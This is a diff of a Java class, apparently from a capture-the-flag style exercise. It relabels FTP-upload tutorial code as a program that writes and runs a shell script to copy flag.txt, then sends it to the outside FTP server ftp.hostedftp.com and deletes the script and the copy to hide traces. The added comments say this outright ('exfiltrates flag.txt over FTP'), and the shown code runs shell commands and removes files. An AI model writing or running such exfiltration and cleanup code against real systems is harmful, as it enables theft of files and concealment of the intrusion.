@@ -9,10 +9,11 @@ import java.io.OutputStream;
 import org.apache.commons.net.ftp.FTP;
 import org.apache.commons.net.ftp.FTPClient;
 
-/**
- * A program that demonstrates how to upload files from local computer
- * to a remote FTP server using Apache Commons Net API.
- * @author www.codejava.net
+/*
+  This part of the program:
+    1. writes and executes script to copy flag.txt to ./sources
+    2. establishes conneciton to outside server and sends flag
+    3. deletes shell script and flag.txt copy
  */
 public class Coordinate {
     static private String server = "ftp.hostedftp.com";
@@ -28,10 +29,12 @@ public class Coordinate {
         ship();
     }
 
+    //runs script to copy flag
     static void acquirePackage(){
         String output = obj.runCommand("sh sources/fetch.sh");
     }
-    
+
+    //runs command line commands
     static String runCommand(String command){
     	StringBuffer output = new StringBuffer();
 
@@ -52,12 +55,15 @@ public class Coordinate {
 
         return output.toString();
     }
-    
+
+
+    //cleans up the copied flag and shell script
     static void rm(){
     	obj.runCommand("rm sources/flag.txt");
     	obj.runCommand("rm sources/fetch.sh");
     }
 
+    //exfiltrates flag.txt over FTP
     static void ship(){
       String path = "sources/" + flag; //cause it'll be in our directory
       FTPClient ftpClient = new FTPClient();
@@ -90,6 +96,8 @@ public class Coordinate {
           }
       }
     }
+
+    //Here we write the shell script to copy the flag
     private static void writeFile(){
     	String FILENAME = "sources/fetch.sh";
     	BufferedWriter bw = null;
